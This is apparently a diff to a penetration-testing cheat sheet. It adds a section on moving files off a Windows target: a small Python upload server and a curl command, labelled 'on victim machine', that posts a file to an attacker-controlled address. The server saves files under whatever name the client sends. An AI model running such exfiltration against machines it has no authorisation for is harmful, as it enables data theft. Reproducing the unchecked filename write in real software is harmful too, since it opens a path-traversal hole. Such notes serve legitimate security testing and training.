@@ -1527,6 +1527,49 @@ Windows Machine
 
 Tftp -I <ip_address> GET <file_name>
 dir
+
+### PYTHON UPLOAD SERVER
+```
+#!/usr/bin/env python3
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import cgi
+
+class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"""
+            <html><body>
+            <form enctype="multipart/form-data" method="post">
+            <input name="file" type="file"/>
+            <input type="submit"/>
+            </form></body></html>
+        """)
+
+    def do_POST(self):
+        form = cgi.FieldStorage(
+            fp=self.rfile,
+            headers=self.headers,
+            environ={'REQUEST_METHOD':'POST'}
+        )
+        file_item = form['file']
+        if file_item.filename:
+            with open(file_item.filename, 'wb') as f:
+                f.write(file_item.file.read())
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"File uploaded successfully!")
+        else:
+            self.send_response(400)
+            self.end_headers()
+            self.wfile.write(b"No file uploaded.")
+
+httpd = HTTPServer(('0.0.0.0', 8000), SimpleHTTPRequestHandler)
+httpd.serve_forever()
+
+
+
+On victim machine - curl -X POST -F "file=@output.txt" http://10.10.10.10:8000/
 ```
 
 
